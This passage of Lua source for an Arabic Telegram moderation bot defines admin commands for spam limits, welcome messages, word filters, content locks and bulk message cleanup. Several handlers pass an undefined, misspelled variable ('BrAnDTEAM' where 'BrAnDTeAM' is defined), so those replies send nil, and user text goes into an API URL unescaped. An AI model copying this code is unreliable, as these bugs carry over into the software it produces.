if text and (text:match("^ضع تكرار (%d+)$") or text:match("^وضع تكرار (%d+)$")) then   
local TextSpam = text:match("ضع تكرار (%d+)$") or text:match("وضع تكرار (%d+)$")
if tonumber(TextSpam) < 2 then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ قم بتحديد عدد اكبر من 2 للتكرار', 1, 'md')
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم وضع عدد التكرار ↫ '..TextSpam, 1, 'md')
DevBrAnD:hset(BrAnD.."BrAnD:Spam:Group:User"..msg.chat_id_ ,"Num:Spam" ,TextSpam) 
end
end
if text and (text:match("^ضع زمن التكرار (%d+)$") or text:match("^وضع زمن التكرار (%d+)$")) then  
local TextSpam = text:match("ضع زمن التكرار (%d+)$") or text:match("وضع زمن التكرار (%d+)$")
DevBrAnD:hset(BrAnD.."BrAnD:Spam:Group:User"..msg.chat_id_ ,"Num:Spam:Time" ,TextSpam) 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم وضع زمن التكرار ↫ '..TextSpam, 1, 'md')
end
--     SoUrCe BrAnD     --
if Manager(msg) then
if text and text == 'تفعيل الايدي بالصوره' and ChCheck(msg) then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Id:Photo'..msg.chat_id_) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الايدي بالصوره بالتاكيد مفعل', 1, 'md')
else
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تفعيل الايدي بالصوره'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:del(BrAnD..'BrAnD:Lock:Id:Photo'..msg.chat_id_)
end end
if text and text == 'تعطيل الايدي بالصوره' and ChCheck(msg) then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Id:Photo'..msg.chat_id_) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الايدي بالصوره بالتاكيد معطل', 1, 'md')
else
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تعطيل الايدي بالصوره'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:set(BrAnD..'BrAnD:Lock:Id:Photo'..msg.chat_id_,true)
end end 

if text and text == 'تفعيل الايدي' and ChCheck(msg) then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Id'..msg.chat_id_) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الايدي بالتاكيد مفعل ', 1, 'md')
else
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تفعيل الايدي بنجاح'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:del(BrAnD..'BrAnD:Lock:Id'..msg.chat_id_)
end end 
if text and text == 'تعطيل الايدي' and ChCheck(msg) then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Id'..msg.chat_id_) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الايدي بالتاكيد معطل ', 1, 'md')
else
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تعطيل الايدي بنجاح'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:set(BrAnD..'BrAnD:Lock:Id'..msg.chat_id_,true)
end end
end
--     SoUrCe BrAnD     --
if text == 'ضع رابط' or text == 'وضع رابط' or text == 'ضع الرابط' or text == 'وضع الرابط' then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ ارسل رابط المجموعه او رابط قناة المجموعه', 1, 'md')
DevBrAnD:setex(BrAnD.."BrAnD:Set:Groups:Links"..msg.chat_id_..""..msg.sender_user_id_,300,true) 
end
if text == 'انشاء رابط' or text == 'انشاء الرابط' then
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if not DevBrAnD:get(BrAnD.."BrAnD:Groups:Links"..msg.chat_id_)  then 
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
DevBrAnD:set(BrAnD.."BrAnD:Groups:Links"..msg.chat_id_,LinkGroup) 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم انشاء رابط جديد ارسل ↫ الرابط', 1, 'md')
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ ليست لدي صلاحية دعوة المستخدمين عبر الرابط يرجى التحقق من الصلاحيات', 1, 'md')
end
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ ارسل رابط المجموعه او رابط قناة المجموعه', 1, 'md')
DevBrAnD:setex(BrAnD.."BrAnD:Set:Groups:Links"..msg.chat_id_..""..msg.sender_user_id_,300,true) 
end
end
end
--     SoUrCe BrAnD     --
if Admin(msg) then
if text and text:match("^تفعيل الترحيب$") and ChCheck(msg) then
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تفعيل الترحيب بنجاح'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:set(BrAnD.."BrAnD:Lock:Welcome"..msg.chat_id_,true)
end
if text and text:match("^تعطيل الترحيب$") and ChCheck(msg) then
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تعطيل الترحيب بنجاح'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:del(BrAnD.."BrAnD:Lock:Welcome"..msg.chat_id_)
end
if DevBrAnD:get(BrAnD..'BrAnD:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_) then 
if text == 'الغاء' then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم الغاء حفظ كليشة الترحيب', 1, 'md')
DevBrAnD:del(BrAnD..'BrAnD:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevBrAnD:del(BrAnD..'BrAnD:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_)
DevBrAnD:set(BrAnD..'BrAnD:Groups:Welcomes'..msg.chat_id_,text)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم حفظ كليشة الترحيب', 1, 'md')
return false   
end
if text and text:match("^ضع ترحيب$") and ChCheck(msg) or text and text:match("^وضع ترحيب$") and ChCheck(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ ارسل لي الترحيب الان\n♰ ⌯ تستطيع اضافة مايلي ↫ ⤈\n♰ ⌯ دالة عرض الاسم ↫ firstname\n♰ ⌯ دالة عرض المعرف ↫ username', 1, 'md')
DevBrAnD:set(BrAnD..'BrAnD:setwelcome'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
if text and text:match("^حذف الترحيب$") and ChCheck(msg) or text and text:match("^حذف ترحيب$") and ChCheck(msg) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم حذف الترحيب")  
DevBrAnD:del(BrAnD..'BrAnD:Groups:Welcomes'..msg.chat_id_)
end
if text and text:match("^جلب الترحيب$") and ChCheck(msg) or text and text:match("^جلب ترحيب$") and ChCheck(msg) or text and text:match("^الترحيب$") and ChCheck(msg) then
local wel = DevBrAnD:get(BrAnD..'BrAnD:Groups:Welcomes'..msg.chat_id_)
if wel then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, wel, 1, 'md')
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ لم يتم وضع الترحيب \n♰ ⌯ ارسل ↫ ضع ترحيب للحفظ ', 1, 'md')
end
end
--     SoUrCe BrAnD     --
if DevBrAnD:get(BrAnD..'BrAnD:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_) then  
if text == 'الغاء' then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم الغاء حفظ الوصف", 1, 'md')
DevBrAnD:del(BrAnD..'BrAnD:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
return false  
end 
DevBrAnD:del(BrAnD..'BrAnD:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_)
https.request('https://api.telegram.org/bot'..TokenBot..'/setChatDescription?chat_id='..msg.chat_id_..'&description='..text) 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم تغيير وصف المجموعه', 1, 'md')
return false  
end 
if text and text:match("^ضع وصف$") and ChCheck(msg) or text and text:match("^وضع وصف$") and ChCheck(msg) then  
DevBrAnD:set(BrAnD..'BrAnD:SetDescription'..msg.chat_id_..':'..msg.sender_user_id_,true)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ ارسل لي الوصف الان', 1, 'md')
end
--     SoUrCe BrAnD     --
if text and text == "منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ ارسل لي الكلمه الان", 1, 'md') 
DevBrAnD:set(BrAnD.."BrAnD:SetFilters"..msg.sender_user_id_..msg.chat_id_,"add")  
return false  
end    
if DevBrAnD:get(BrAnD.."BrAnD:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "add" then
if text == 'الغاء' then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم الغاء امر المنع', 1, 'md')
DevBrAnD:del(BrAnD.."BrAnD:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم منع الكلمه ↫ "..text, 1, 'html')
DevBrAnD:del(BrAnD.."BrAnD:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
DevBrAnD:hset(BrAnD..'BrAnD:Filters:'..msg.chat_id_, text,'newword')
return false
end
if text and text == "الغاء منع" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then       
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ ارسل لي الكلمه الان", 1, 'md') 
DevBrAnD:set(BrAnD.."BrAnD:SetFilters"..msg.sender_user_id_..msg.chat_id_,"del")  
return false  
end    
if DevBrAnD:get(BrAnD.."BrAnD:SetFilters"..msg.sender_user_id_..msg.chat_id_) == "del" then   
if text == 'الغاء' then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم الغاء امر الغاء المنع', 1, 'md')
DevBrAnD:del(BrAnD.."BrAnD:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
return false  
end   
if not DevBrAnD:hget(BrAnD..'BrAnD:Filters:'..msg.chat_id_, text) then  
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ الكلمه ↫ "..text.." غير ممنوعه", 1, 'html')
DevBrAnD:del(BrAnD.."BrAnD:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
else
DevBrAnD:hdel(BrAnD..'BrAnD:Filters:'..msg.chat_id_, text)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ الكلمه ↫ "..text.." تم الغاء منعها", 1, 'html')
DevBrAnD:del(BrAnD.."BrAnD:SetFilters"..msg.sender_user_id_..msg.chat_id_)  
end
return false
end
--     SoUrCe BrAnD     --
if SudoBot(msg) then
if text and text == "الاحصائيات" and ChCheck(msg) or text and text == "↫ الاحصائيات♰" then
local gps = DevBrAnD:scard(BrAnD.."BrAnD:Groups") local users = DevBrAnD:scard(BrAnD.."BrAnD:Users") 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ احصائيات البوت ↫ ⤈\n♰ ⌯ عدد المشتركين ↫ ❨ '..users..' ❩\n♰ ⌯ عدد المجموعات ↫ ❨ '..gps..' ❩', 1, 'md')
end
if text and text == "المشتركين" and ChCheck(msg) or text and text == "↫ المشتركين♰" then
local users = DevBrAnD:scard(BrAnD.."BrAnD:Users")
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ عدد المشتركين ↫ ❨ '..users..' ❩', 1, 'md')
end
end
--     SoUrCe BrAnD     --
if text and text == 'المجموعات' and ChCheck(msg) or text and text == '↫ المجموعات♰' then
if not SudoBot(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ للمطورين فقط ', 1, 'md')
else
local list = DevBrAnD:smembers(BrAnD.."BrAnD:Groups")
local t = '♰ ⌯ مجموعات البوت ↫ ⤈ \n'
for k,v in pairs(list) do
t = t..k.."~ : `"..v.."`\n" 
end
if #list == 0 then
t = '♰ ⌯ لا يوجد مجموعات مفعله'
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1,t, 1, 'md')
end end
--     SoUrCe BrAnD     --
if text and text:match('^تنظيف (%d+)$') and ChCheck(msg) then  
if not DevBrAnD:get(BrAnD..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_) then  
local Number = tonumber(text:match('^تنظيف (%d+)$')) 
if Number > 1000 then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ لاتستطيع تنظيف اكثر من 1000 رساله', 1, 'md')
return false  
end  
local Message = msg.id_
for i=1,tonumber(Number) do
DeleteMessage(msg.chat_id_,{[0]=Message})
Message = Message - 1048576 
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم تنظيف *'..Number..'* من الرسائل', 1, 'md')
DevBrAnD:setex(BrAnD..'Delete:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
end 
end
if text == "تنظيف المشتركين" and Sudo(msg) and ChCheck(msg) then 
local pv = DevBrAnD:smembers(BrAnD.."BrAnD:Users")
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]
},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",  
chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} 
},function(arg,data) 
if data.ID and data.ID == "Ok" then
else
DevBrAnD:srem(BrAnD.."BrAnD:Users",pv[i])
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ *لا يوجد مشتركين وهميين*', 1, 'md')
else
local ok = #pv - sendok
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ عدد المشتركين الان ↫ { '..#pv..' }\n♰ ⌯ تم حذف ↫ { '..sendok..' } من المشتركين\n♰ ⌯ العدد الحقيقي الان  ↫ ( '..ok..' ) \n', 1, 'md')
end
end
end,nil)
end,nil)
end
return false
end
--     SoUrCe BrAnD     --
if text == "تنظيف الكروبات" and Sudo(msg) and ChCheck(msg) or text == "تنظيف المجموعات" and Sudo(msg) and ChCheck(msg) then 
local group = DevBrAnD:smembers(BrAnD.."BrAnD:Groups")
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.ChANnEl_ and data.type_.ChANnEl_.status_ and data.type_.ChANnEl_.status_.ID == "ChatMemberStatusMember" then
DevBrAnD:srem(BrAnD.."BrAnD:Groups",group[i]) 
changeChatMemberStatus(group[i], BrAnD, "Left")
w = w + 1
end
if data and data.type_ and data.type_.ChANnEl_ and data.type_.ChANnEl_.status_ and data.type_.ChANnEl_.status_.ID == "ChatMemberStatusLeft" then
DevBrAnD:srem(BrAnD.."BrAnD:Groups",group[i]) 
q = q + 1
end
if data and data.type_ and data.type_.ChANnEl_ and data.type_.ChANnEl_.status_ and data.type_.ChANnEl_.status_.ID == "ChatMemberStatusKicked" then
DevBrAnD:srem(BrAnD.."BrAnD:Groups",group[i]) 
q = q + 1
end
if data and data.code_ and data.code_ == 400 then
DevBrAnD:srem(BrAnD.."BrAnD:Groups",group[i]) 
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ *لاتوجد مجموعات وهميه*', 1, 'md')   
else
local BrAnDgp2 = (w + q)
local BrAnDgp3 = #group - BrAnDgp2
if q == 0 then
BrAnDgp2 = ''
else
BrAnDgp2 = '\n♰ ⌯ تم حذف ↫ { '..q..' } مجموعه من البوت'
end
if w == 0 then
BrAnDgp1 = ''
else
BrAnDgp1 = '\n♰ ⌯ تم حذف ↫ { '..w..' } مجموعه بسبب تنزيل البوت الى عضو'
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1,'♰ ⌯ عدد الكروبات الان ↫ { '..#group..' }'..BrAnDgp1..''..BrAnDgp2..'\n♰ ⌯ العدد الحقيقي الان  ↫ ( '..BrAnDgp3..' ) \n ', 1, 'md')
end end
end,nil)
end
return false
end 
end
--     SoUrCe BrAnD     --
if text == "تفعيل امسح" and Constructor(msg) and SoUrCeCh(msg) then
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تفعيل امسح بنجاح'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:set(BrAnD..'BrAnD:Lock:Clean'..msg.chat_id_,true)  
end
if text == "تعطيل امسح" and Constructor(msg) and SoUrCeCh(msg) then
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تعطيل امسح بنجاح'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:del(BrAnD..'BrAnD:Lock:Clean'..msg.chat_id_) 
end
if Cleaner(msg) then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Clean'..msg.chat_id_) then 
if text == "الميديا" and SoUrCeCh(msg) or text == "عدد الميديا" and SoUrCeCh(msg) then 
local M = DevBrAnD:scard(BrAnD.."BrAnD:cleaner"..msg.chat_id_)
if M ~= 0 then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ عدد الميديا ↫ "..M, 1, 'md') 
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ لاتوجد ميديا هنا", 1, 'md') 
end end
if text == "امسح" and SoUrCeCh(msg) or text == "تنظيف ميديا" and SoUrCeCh(msg) or text == "تنظيف الميديا" and SoUrCeCh(msg) then
local list = DevBrAnD:smembers(BrAnD.."BrAnD:cleaner"..msg.chat_id_)
local Del = 0
for k,v in pairs(list) do
Del = (Del + 1)
local Message = v
DeleteMessage(msg.chat_id_,{[0]=Message})
Message = Message - 1048576 
end
if Del ~= 0 then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم حذف "..Del.." من الميديا", 1, 'md') 
DevBrAnD:del(BrAnD.."BrAnD:cleaner"..msg.chat_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ لاتوجد ميديا هنا", 1, 'md') 
end end 
end
end
--     SoUrCe BrAnD     --
if Admin(msg) then
if text == "تنظيف تعديل" or text == "تنظيف التعديل" and ChCheck(msg) then   
BrAnD_Del = {[0]= msg.id_}
local Message = msg.id_
for i=1,100 do
Message = Message - 1048576
BrAnD_Del[i] = Message
end
tdcli_function({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = BrAnD_Del},function(arg,data)
new = 0
BrAnD_Del2 = {}
for i=0 ,data.total_count_ do
if data.messages_[i] and (not data.messages_[i].edit_date_ or data.messages_[i].edit_date_ ~= 0) then
BrAnD_Del2[new] = data.messages_[i].id_
new = new + 1
end
end
DeleteMessage(msg.chat_id_,BrAnD_Del2)
end,nil)  
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم تنظيف 100 من الرسائل المعدله', 1, 'md')
end
--     SoUrCe BrAnD     --
if ChatType == 'sp' or ChatType == 'gp'  then
if Admin(msg) then
if text and text:match("^فتح (.*)$") then
local unlockpts = {string.match(text, "^(فتح) (.*)$")}
if unlockpts[2] == "التعديل" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح التعديل")  
DevBrAnD:del(BrAnD..'BrAnD:Lock:EditMsgs'..msg.chat_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ التعديل بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if unlockpts[2] == "التعديل الميديا" or unlockpts[2] == "تعديل الميديا" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:EditMsgs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح تعديل الميديا")  
DevBrAnD:del(BrAnD..'BrAnD:Lock:EditMsgs'..msg.chat_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تعديل الميديا بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if unlockpts[2] == "الفارسيه" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Farsi'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح الفارسيه")  
DevBrAnD:del(BrAnD..'BrAnD:Lock:Farsi'..msg.chat_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الفارسيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if unlockpts[2] == "الفشار" then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Fshar'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح الفشار")  
DevBrAnD:set(BrAnD..'BrAnD:Lock:Fshar'..msg.chat_id_,true)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الفشار بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if unlockpts[2] == "الطائفيه" then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Taf'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح الطائفيه")  
DevBrAnD:set(BrAnD..'BrAnD:Lock:Taf'..msg.chat_id_,true)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الطائفيه بالفعل مفتوحه في المجموعه', 1, 'md')
end
end
if unlockpts[2] == "الكفر" then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Kfr'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح الكفر")  
DevBrAnD:set(BrAnD..'BrAnD:Lock:Kfr'..msg.chat_id_,true)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الكفر بالفعل مفتوح في المجموعه', 1, 'md')
end
end
if unlockpts[2] == "الفارسيه بالطرد" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:FarsiBan'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح الفارسيه بالطرد")  
DevBrAnD:del(BrAnD..'BrAnD:Lock:FarsiBan'..msg.chat_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الفارسيه بالطرد بالفعل مفتوحه', 1, 'md')
end
end
if unlockpts[2] == "البوتات" or unlockpts[2] == "البوتات بالطرد" or unlockpts[2] == "البوتات بالتقييد" or unlockpts[2] == "البوتات بالتقيد" then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح البوتات")  
DevBrAnD:del(BrAnD.."BrAnD:Lock:Bots"..msg.chat_id_)  
end
if unlockpts[2] == "التكرار" then 
DevBrAnD:hdel(BrAnD.."BrAnD:Spam:Group:User"..msg.chat_id_ ,"Spam:User")  
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح التكرار")  
end
if BasicConstructor(msg) then
if unlockpts[2] == "التثبيت" then
if DevBrAnD:get(BrAnD..'BrAnD:Lock:Pin'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم فتح التثبيت")  
DevBrAnD:del(BrAnD..'BrAnD:Lock:Pin'..msg.chat_id_)
DevBrAnD:srem(BrAnD.."BrAnD:Lock:Pinpin",msg.chat_id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ التثبيت بالفعل مفتوح في المجموعه', 1, 'md')
end end end
end
end
--     SoUrCe BrAnD     --
if Admin(msg) then
if text and text:match("^قفل (.*)$") then
local LockText = {string.match(text, "^(قفل) (.*)$")}
if LockText[2] == "الدردشه" then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Text'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل الدردشه")  
DevBrAnD:set(BrAnD..'BrAnD:Lock:Text'..msg.chat_id_,true)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الدردشه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الاونلاين" then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Inline'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل الاونلاين")  
DevBrAnD:set(BrAnD..'BrAnD:Lock:Inline'..msg.chat_id_,true)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الاونلاين بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الصور" then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Photo'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل الصور")  
DevBrAnD:set(BrAnD..'BrAnD:Lock:Photo'..msg.chat_id_,true)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الصور بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الكلايش" then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Spam'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل الكلايش")  
DevBrAnD:set(BrAnD..'BrAnD:Lock:Spam'..msg.chat_id_,true)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الكلايش بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الدخول" then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Join'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل الدخول")  
DevBrAnD:set(BrAnD..'BrAnD:Lock:Join'..msg.chat_id_,true)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الدخول بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الفيديو" then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Videos'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل الفيديو")  
DevBrAnD:set(BrAnD..'BrAnD:Lock:Videos'..msg.chat_id_,true)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الفيديو بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "المتحركه" then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Gifs'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل المتحركه")  
DevBrAnD:set(BrAnD..'BrAnD:Lock:Gifs'..msg.chat_id_,true)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ المتحركه بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الاغاني" then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Music'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل الاغاني")  
DevBrAnD:set(BrAnD..'BrAnD:Lock:Music'..msg.chat_id_,true)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الاغاني بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "الصوت" then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Voice'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل الصوت")  
DevBrAnD:set(BrAnD..'BrAnD:Lock:Voice'..msg.chat_id_,true)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الصوت بالفعل مقفل في المجموعه', 1, 'md')
end
end
if LockText[2] == "الروابط" then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Links'..msg.chat_id_) then
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","♰ ⌯ تم قفل الروابط")  
DevBrAnD:set(BrAnD..'BrAnD:Lock:Links'..msg.chat_id_,true)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ الروابط بالفعل مقفله في المجموعه', 1, 'md')
end
end
if LockText[2] == "المواقع" then
if not DevBrAnD:get(BrAnD..'BrAnD:Lock:Location'..msg.chat_id_) then
